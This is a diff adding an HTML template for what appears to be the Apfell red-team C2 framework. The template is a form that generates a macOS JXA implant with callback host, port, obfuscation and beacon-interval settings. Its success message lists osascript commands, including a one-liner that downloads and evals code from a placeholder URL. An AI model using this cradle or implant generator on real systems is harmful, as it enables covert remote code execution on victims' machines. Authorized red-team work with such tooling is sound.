@@ -1,0 +1,60 @@
+{% extends "base.html" %}
+{% block body %}
+<h1>
+    Generate an apfell-jxa payload
+</h1>
+<form action="" method="post">
+    {{ errors.token_errors }}
+    <span style="color: red;">{{errors.validate_errors}}</span>
+    {{ form.csrf_token }}
+
+    <br>
+    {{form.callback_host.label}}
+    {{form.callback_host(size=64)}}
+    <span style="color: red;">{{ errors.callback_host_errors }}</span>
+
+    <br>
+    {{form.callback_port.label}}
+    {{form.callback_port(size=32)}}
+    <span style="color: red;">{{ errors.callback_port_errors }}</span>
+
+    <br>
+    {{form.obfuscation.label}}
+    {{form.obfuscation(size=10)}}
+    <span style="color: red;">{{ errors.obfuscation_errors }}</span>
+
+    <br>
+    {{form.output_directory.label}}
+    {{form.output_directory(size=32)}}
+    <span style="color: red;">{{ errors.output_directory_errors }}</span>
+    Full Path
+
+    <br>
+    {{form.callback_interval.label}}
+    {{form.callback_interval(size=10)}}
+     <span style="color: red;">{{ errors.callback_interval_errors }}</span>
+    Time in seconds
+    <br>
+    {{form.submit()}}
+</form>
+{% if success %}
+<p>
+    Successfully created payload.<br>
+    This payload can be executed as follows:<br>
+    <ul>
+    <li>
+        <strong>osascript -l JavaScript {{form.output_directory}}</strong>
+    </li>
+    <li>
+        <strong>osascript {{form.output_directory}}</strong>
+    </li>
+    <li>
+        <strong>osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://HOST_YOUR_FILE/FILE_NAME')),$.NSUTF8StringEncoding)));"</strong>
+    </li>
+</ul>
+</p>
+{% endif %}
+{% endblock %}
+
+{% block scripts %}
+{% endblock %}
